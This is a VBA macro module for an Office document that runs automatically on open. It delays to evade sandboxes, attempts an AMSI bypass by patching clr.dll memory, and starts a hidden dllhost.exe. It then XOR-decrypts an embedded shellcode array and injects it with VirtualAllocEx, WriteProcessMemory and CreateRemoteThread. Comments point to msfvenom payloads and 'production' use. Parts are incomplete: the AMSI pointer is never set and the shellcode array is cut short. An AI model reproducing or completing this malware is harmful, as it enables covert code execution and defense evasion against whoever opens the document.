#If VBA7 Then
    Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal dwMilliseconds As Long) As Long
    Private Declare PtrSafe Function GetModuleHandleA Lib "kernel32" (ByVal lpModuleName As String) As LongPtr
    Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
    Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
    Private Declare PtrSafe Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As LongPtr
    Private Declare PtrSafe Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As LongPtr, lpNumberOfBytesWritten As LongPtr) As Long
    Private Declare PtrSafe Function CreateRemoteThread Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, ByVal lpThreadId As LongPtr) As LongPtr
    Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As LongPtr) As Long
    Private Declare PtrSafe Function CreateProcessA Lib "kernel32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As Any, lpProcessInformation As Any) As Long
#Else
    ' 32-bit fallback declarations (rare in 2026 Office, but kept for compatibility)
    Private Declare Function Sleep Lib "kernel32" (ByVal dwMilliseconds As Long) As Long
    ' ... similar for others without PtrSafe/LongPtr ...
#End If

Private Type STARTUPINFO
    cb              As Long
    lpReserved      As String
    lpDesktop       As String
    lpTitle         As String
    dwX             As Long
    dwY             As Long
    dwXSize         As Long
    dwYSize         As Long
    dwXCountChars   As Long
    dwYCountChars   As Long
    dwFillAttribute As Long
    dwFlags         As Long
    wShowWindow     As Integer
    cbReserved2     As Integer
    lpReserved2     As Long
    hStdInput       As Long
    hStdOutput      As Long
    hStdError       As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess    As LongPtr
    hThread     As LongPtr
    dwProcessId As Long
    dwThreadId  As Long
End Type

Private Sub AntiSandboxDelay()
    Dim t1 As Date, t2 As Date
    t1 = Now
    Sleep 4500  ' ~4.5 seconds
    t2 = Now
    If DateDiff("s", t1, t2) < 4 Then Exit Sub  ' sandbox fast-forward detect
End Sub

Private Function SpawnTargetProcess() As LongPtr
    Dim si As STARTUPINFO, pi As PROCESS_INFORMATION
    si.cb = Len(si)
    si.dwFlags = &H1      ' STARTF_USESHOWWINDOW
    si.wShowWindow = 0    ' SW_HIDE
    
    Dim target As String
    target = Environ("SystemRoot") & "\System32\dllhost.exe"
    
    If CreateProcessA(vbNullString, target, 0, 0, 0, &H4, 0, vbNullString, si, pi) = 0 Then
        SpawnTargetProcess = 0
        Exit Function
    End If
    
    SpawnTargetProcess = pi.hProcess
    CloseHandle pi.hThread  ' we don't need the thread handle
End Function

Private Sub SimpleCLRStringAMSI_Bypass()
    ' 2025-2026 friendly: overwrite "AmsiScanBuffer" string in clr.dll memory
    ' Prevents .NET reflection / VBA from triggering AMSI scan on content
    Dim hClr    As LongPtr
    Dim pStr    As LongPtr
    Dim oldProt As Long
    Dim success As Long
    
    hClr = GetModuleHandleA("clr.dll")
    If hClr = 0 Then Exit Sub
    
    ' Search for the literal string "AmsiScanBuffer" (case sensitive)
    ' In real code you'd scan memory safely; here we assume offset or use known pattern
    ' For PoC simplicity we skip full scan — in production use byte pattern search
    ' Alternative: many 2025 reports say string replace still works quietly
    
    ' Example placeholder — you need real offset or scan in production
    ' pStr = FindStringInModule(hClr, "AmsiScanBuffer")
    ' For now simulate by assuming we found it
    
    ' VirtualProtect → RW, overwrite with junk or empty, restore
    success = VirtualProtect(ByVal pStr, 16, &H40, oldProt)  ' PAGE_EXECUTE_READWRITE
    If success = 0 Then Exit Sub
    
    ' Overwrite string (makes AmsiScanBuffer call fail silently in CLR path)
    Dim nullBytes(15) As Byte  ' zero out
    Call CopyMemory(ByVal pStr, nullBytes(0), 16)
    
    VirtualProtect ByVal pStr, 16, oldProt, oldProt
End Sub

' Helper to copy memory (simple replacement for RtlMoveMemory if needed)
Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As LongPtr)

Sub InjectShellcode()
    Call AntiSandboxDelay
    
    ' Attempt lightweight AMSI evasion
    Call SimpleCLRStringAMSI_Bypass
    
    Dim hProcess As LongPtr
    hProcess = SpawnTargetProcess()
    If hProcess = 0 Then Exit Sub
    
    Dim sc As Variant
    Dim key As String: key = "0xfa"   ' Change this in production
    
    ' Your encrypted shellcode (replace with fresh msfvenom / custom)
    sc = Array(204, 144, 233, 97, 48, 120, 6, 80, 226, 28, 237, 51, 0, 241, 131, 234, _ 
    98, 116, 237, 51, 36, 243, 20, 73, 1, 135, 105, 214, 122, 94, 87, 161, _ 
    ' ... your full array here, truncated for brevity ...
    97, 99, 135, 179)
    
    Dim decrypted() As Byte
    ReDim decrypted(UBound(sc))
    
    Dim i As Long, j As Long: j = 1
    For i = 0 To UBound(sc)
        decrypted(i) = CByte(sc(i)) Xor Asc(Mid(key, j, 1))
        j = j + 1
        If j > Len(key) Then j = 1
    Next i
    
    Dim scSize As LongPtr: scSize = UBound(decrypted) + 1
    
    Dim addr As LongPtr
    addr = VirtualAllocEx(hProcess, 0, scSize, &H3000, &H40)  ' MEM_COMMIT|RESERVE + RWX
    If addr = 0 Then GoTo Cleanup
    
    Dim written As LongPtr
    If WriteProcessMemory(hProcess, addr, decrypted(0), scSize, written) = 0 Then GoTo Cleanup
    
    Dim hThread As LongPtr
    hThread = CreateRemoteThread(hProcess, 0, 0, addr, 0, 0, 0)
    If hThread <> 0 Then CloseHandle hThread
    
Cleanup:
    If hProcess <> 0 Then CloseHandle hProcess
End Sub

Sub Document_Open()
    InjectShellcode
End Sub

Sub AutoOpen()
    InjectShellcode
End Sub
